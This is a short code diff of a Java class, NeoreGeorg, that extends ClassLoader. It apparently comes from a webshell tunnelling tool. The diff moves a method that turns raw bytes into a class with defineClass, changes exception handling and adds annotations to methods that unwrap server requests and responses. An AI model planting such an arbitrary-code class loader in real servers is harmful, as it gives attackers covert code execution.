@@ -30,12 +30,6 @@ public class NeoreGeorg extends ClassLoader {
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -67,9 +61,15 @@ public class NeoreGeorg extends ClassLoader {
                 namespace.get(chars).equals(map);
                 return true;
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
         return false;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
@@ -92,8 +92,7 @@ public class NeoreGeorg extends ClassLoader {
         }
     }
 
-
-
+    @SuppressWarnings("all")
     public Object unwrapRequest(Object request) {
         Object internalRequest = request;
         while (true) {
@@ -110,6 +109,7 @@ public class NeoreGeorg extends ClassLoader {
         }
     }
 
+    @SuppressWarnings("all")
     public Object unwrapResponse(Object response) {
         Object internalResponse = response;
         while (true) {
